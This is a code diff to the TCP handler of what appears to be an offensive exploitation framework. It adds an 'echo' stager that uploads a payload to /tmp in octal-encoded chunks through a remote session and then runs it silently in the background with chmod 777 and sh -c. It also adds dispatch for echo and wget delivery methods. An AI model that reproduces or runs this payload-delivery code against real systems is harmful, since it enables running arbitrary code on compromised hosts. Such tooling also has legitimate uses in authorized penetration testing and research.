@@ -68,6 +68,35 @@ class Handler(TCP):
             byte_octals.append(byte_octal)
         return ''.join(byte_octals)
 
+    def echo_stage(self, payload, sender, args=[], payload_args=None, location='/tmp', encode=False):
+        self.badges.output_process("Sending payload stage...")
+        filename = binascii.hexlify(os.urandom(8)).decode()
+        path = location + '/' + filename
+
+        echo_stream = "echo -n '{}' >> {}"
+        echo_max_length = 100
+
+        size = len(payload)
+        num_parts = int(size / echo_max_length) + 1
+
+        for i in range(0, num_parts):
+            current = i * echo_max_length
+            block = self.bytes_to_octal(payload[current:current + echo_max_length])
+            command = echo_stream.format(block, path)
+
+            self.badges.output_multi(f"Uploading payload... ({str(current)}/{str(size)})")
+            if encode:
+                sender(*args, (command + '\n').encode())
+            else:
+                sender(*args, command)
+
+        args = args if args is not None else ""
+
+        if encode:
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &\n".encode())
+        else:
+            sender(*args, f"chmod 777 {path}; sh -c '{path} {payload_args}' 2>/dev/null &")
+    
     def printf_stage(self, payload, sender, args=[], payload_args=None, location='/tmp', encode=False):
         self.badges.output_process("Sending payload stage...")
         filename = binascii.hexlify(os.urandom(8)).decode()
@@ -114,6 +143,13 @@ class Handler(TCP):
             if payload['Category'].lower() == 'stager':
                 if post.lower() == 'printf':
                     self.printf_stage(payload['Payload'], sender, args, payload['Args'], location)
+                elif post.lower() == 'echo':
+                    self.echo_stage(payload['Payload'], sender, args, payload['Args'], location)
+                elif post.lower() == 'wget':
+                    self.wget_stage(payload['Payload'], sender, args, payload['Args'], location)
+                else:
+                    self.output_warning("Invalid post method, using printf by default.")
+                    self.printf_stage(payload['Payload'], sender, args, payload['Args'], location)
             elif payload['Category'].lower() == 'single':
                 sender(*args, payload['Payload'])
             else:
@@ -134,6 +170,13 @@ class Handler(TCP):
 
                 if payload['Category'].lower() == 'stager':
                     if post.lower() == 'printf':
+                        self.printf_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
+                    elif post.lower() == 'echo':
+                        self.echo_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
+                    elif post.lower() == 'wget':
+                        self.wget_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
+                    else:
+                        self.output_warning("Invalid post method, using printf by default.")
                         self.printf_stage(payload['Payload'], new_session.send, args, payload['Args'], location, encode=True)
                 elif payload['Category'].lower() == 'single':
                     new_session.send_command(payload['Payload'])
